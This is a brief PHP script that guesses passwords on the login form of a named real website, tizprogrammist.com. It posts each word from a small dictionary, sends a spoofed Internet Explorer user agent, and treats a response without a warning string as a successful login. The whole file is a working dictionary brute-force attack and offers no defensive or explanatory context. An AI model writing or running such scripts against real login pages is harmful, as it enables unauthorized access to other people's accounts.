<?php
/**
 * Created by PhpStorm.
 * User: morontt
 * Date: 20.02.15
 * Time: 0:43
 */

$z = curl_init("http://tizprogrammist.com/login");

curl_setopt($z, CURLOPT_TIMEOUT, 30);
curl_setopt($z, CURLOPT_USERAGENT, 'Mozilla/4.0 (compatible; MSIE 6.01; Windows NT 6.0)');

curl_setopt($z, CURLOPT_POST, true);
curl_setopt($z, CURLOPT_RETURNTRANSFER, true);

$dict = ['test', 'abc', 'zzzz'];

foreach ($dict as $word) {
    $data = 'LoginForm%5Bpassword%5D=' . $word;
    curl_setopt($z, CURLOPT_POSTFIELDS, $data);
    $response = curl_exec($z);
    if (mb_strpos($response, 'Варнинг') !== false) {
        echo $word . " - fail\n";
    } else {
        echo $word . " - success\n";
        break;
    }
}

curl_close($z);
